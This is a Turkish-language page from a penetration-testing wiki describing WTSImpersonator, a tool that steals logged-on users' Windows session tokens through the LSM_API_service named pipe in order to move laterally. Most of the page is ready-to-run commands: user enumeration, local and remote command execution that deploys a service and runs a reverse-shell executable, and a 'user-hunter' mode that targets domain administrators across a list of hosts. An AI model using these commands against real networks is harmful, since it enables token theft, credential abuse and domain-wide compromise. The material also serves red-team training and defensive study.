{{#include ../../banners/hacktricks-training.md}}

**WTS Impersonator** aracı, **"\\pipe\LSM_API_service"** RPC İsimli borusunu kullanarak, oturum açmış kullanıcıları gizlice sayar ve onların token'larını ele geçirir, geleneksel Token Taklit tekniklerini atlar. Bu yaklaşım, ağlar içinde sorunsuz yan hareketler sağlamaktadır. Bu tekniğin yeniliği **Omri Baso'ya atfedilmektedir; çalışmaları [GitHub](https://github.com/OmriBaso/WTSImpersonator)** üzerinde mevcuttur.

### Temel İşlevsellik

Araç, bir dizi API çağrısı aracılığıyla çalışır:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Ana Modüller ve Kullanım

- **Kullanıcıları Listeleme**: Araç ile yerel ve uzaktan kullanıcı listeleme mümkündür, her iki senaryo için komutlar kullanılarak:

- Yerel:
```powershell
.\WTSImpersonator.exe -m enum
```
- Uzaktan, bir IP adresi veya ana bilgisayar adı belirterek:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Komutları Çalıştırma**: `exec` ve `exec-remote` modülleri çalışmak için bir **Hizmet** bağlamına ihtiyaç duyar. Yerel yürütme, yalnızca WTSImpersonator çalıştırılabilir dosyasını ve bir komutu gerektirir:

- Yerel komut yürütme örneği:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe, bir hizmet bağlamı elde etmek için kullanılabilir:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Uzaktan Komut Yürütme**: PsExec.exe'ye benzer şekilde uzaktan bir hizmet oluşturmayı ve yüklemeyi içerir, uygun izinlerle yürütmeye olanak tanır.

- Uzaktan yürütme örneği:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Kullanıcı Avlama Modülü**: Birden fazla makinede belirli kullanıcıları hedef alır, onların kimlik bilgileri altında kod çalıştırır. Bu, birden fazla sistemde yerel yönetici haklarına sahip Alan Yöneticilerini hedef almak için özellikle yararlıdır.
- Kullanım örneği:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
